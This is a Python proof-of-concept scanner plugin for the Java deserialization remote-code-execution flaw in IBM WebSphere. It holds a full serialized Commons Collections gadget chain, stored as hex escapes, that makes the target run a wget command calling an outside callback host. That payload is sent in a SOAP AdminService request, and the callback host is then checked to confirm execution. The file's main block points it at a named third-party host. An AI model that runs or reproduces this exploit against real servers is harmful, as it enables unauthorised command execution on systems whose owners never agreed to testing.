from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = java unserialize websphere rce
#___From___ = http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/

import random
import base64


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        flag = ""
        for i in range(16):
            flag += chr(ord('a')+random.randint(0,25))
        target = arg
        p = "\xac\xed\x00\x05\x73\x72\x00\x32\x73\x75\x6e\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x61\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x2e\x41\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x55\xca\xf5\x0f\x15\xcb\x7e\xa5\x02\x00\x02\x4c\x00\x0c\x6d\x65\x6d\x62\x65\x72\x56\x61\x6c\x75\x65\x73\x74\x00\x0f\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4d\x61\x70\x3b\x4c\x00\x04\x74\x79\x70\x65\x74\x00\x11\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x78\x70\x73\x7d\x00\x00\x00\x01\x00\x0d\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x4d\x61\x70\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x78\x70\x73\x71\x00\x7e\x00\x00\x73\x72\x00\x2a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x6d\x61\x70\x2e\x4c\x61\x7a\x79\x4d\x61\x70\x6e\xe5\x94\x82\x9e\x79\x10\x94\x03\x00\x01\x4c\x00\x07\x66\x61\x63\x74\x6f\x72\x79\x74\x00\x2c\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x68\x61\x69\x6e\x65\x64\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x30\xc7\x97\xec\x28\x7a\x97\x04\x02\x00\x01\x5b\x00\x0d\x69\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x73\x74\x00\x2d\x5b\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x78\x70\x75\x72\x00\x2d\x5b\x4c\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\xbd\x56\x2a\xf1\xd8\x34\x18\x99\x02\x00\x00\x78\x70\x00\x00\x00\x05\x73\x72\x00\x3b\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x6f\x6e\x73\x74\x61\x6e\x74\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x58\x76\x90\x11\x41\x02\xb1\x94\x02\x00\x01\x4c\x00\x09\x69\x43\x6f\x6e\x73\x74\x61\x6e\x74\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x78\x70\x76\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x52\x75\x6e\x74\x69\x6d\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x49\x6e\x76\x6f\x6b\x65\x72\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x87\xe8\xff\x6b\x7b\x7c\xce\x38\x02\x00\x03\x5b\x00\x05\x69\x41\x72\x67\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0b\x69\x4d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x0b\x69\x50\x61\x72\x61\x6d\x54\x79\x70\x65\x73\x74\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x78\x70\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x02\x74\x00\x0a\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x75\x72\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73\x3b\xab\x16\xd7\xae\xcb\xcd\x5a\x99\x02\x00\x00\x78\x70\x00\x00\x00\x00\x74\x00\x09\x67\x65\x74\x4d\x65\x74\x68\x6f\x64\x75\x71\x00\x7e\x00\x1e\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\xa0\xf0\xa4\x38\x7a\x3b\xb3\x42\x02\x00\x00\x78\x70\x76\x71\x00\x7e\x00\x1e\x73\x71\x00\x7e\x00\x16\x75\x71\x00\x7e\x00\x1b\x00\x00\x00\x02\x70\x75\x71\x00\x7e\x00\x1b\x00\x00\x00\x00\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x75\x71\x00\x7e\x00\x1e\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x76\x71\x00\x7e\x00\x1b\x73\x71\x00\x7e\x00\x16\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74\x00\x54\x77\x67\x65\x74\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x79\x73\x61\x6e\x64\x62\x6f\x78\x2e\x73\x69\x6e\x61\x61\x70\x70\x2e\x63\x6f\x6d\x2f\x6b\x76\x3f\x61\x63\x74\x3d\x73\x65\x74\x26\x6b\x3d\x6a\x61\x76\x61\x75\x6e\x6a\x62\x6f\x73\x73\x61\x30\x62\x39\x32\x33\x38\x32\x30\x64\x63\x63\x35\x30\x39\x61\x26\x76\x3d\x6a\x61\x76\x61\x75\x6e\x74\x00\x04\x65\x78\x65\x63\x75\x71\x00\x7e\x00\x1e\x00\x00\x00\x01\x71\x00\x7e\x00\x23\x73\x71\x00\x7e\x00\x11\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75\x65\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e\x75\x6d\x62\x65\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00\x78\x70\x00\x00\x00\x01\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x00\x77\x08\x00\x00\x00\x10\x00\x00\x00\x00\x78\x78\x76\x72\x00\x12\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x76\x65\x72\x72\x69\x64\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x71\x00\x7e\x00\x3a"
        p = p.replace("a0b923820dcc509a",flag)
        b64 = base64.b64encode(p)
        raw = """
    POST / HTTP/1.0
    Host: 127.0.0.1:8880
    Content-Type: text/xml; charset=utf-8
    Content-Length: 2646
    SOAPAction: "urn:AdminService"
    
    <?xml version='1.0' encoding='UTF-8'?>
    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <SOAP-ENV:Header xmlns:ns0="admin" ns0:WASRemoteRuntimeVersion="8.5.5.1" ns0:JMXMessageVersion="1.2.0" ns0:SecurityEnabled="true" ns0:JMXVersion="1.2.0">
    <LoginMethod>BasicAuth</LoginMethod>
    </SOAP-ENV:Header>
    <SOAP-ENV:Body>
    <ns1:getAttribute xmlns:ns1="urn:AdminService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <objectname xsi:type="ns1:javax.management.ObjectName">%s</objectname>
    <attribute xsi:type="xsd:string">ringBufferSize</attribute>
    </ns1:getAttribute>
    </SOAP-ENV:Body>
    </SOAP-ENV:Envelope>
    
    """ % b64
        code, head, body, errcode, final_url = curl.curl2(target,raw=raw)
        check = "https://pysandbox.sinaapp.com/kv?act=get&k=javaunjbossa0b923820dcc509a".replace("a0b923820dcc509a",flag)
        code, head, body, errcode, final_url = curl.curl2(check)
        if 'javaun' in body and not 'None' in body:
            output(target + ' has java unserialize rce.',result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  websphere  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='websphere Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/websphere/websphere_54c4cd39c77c28b8a8824a7ce2a1d10d.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/websphere/websphere_54c4cd39c77c28b8a8824a7ce2a1d10d.py
#/root/github/poccreate/codesrc/exp-1664.py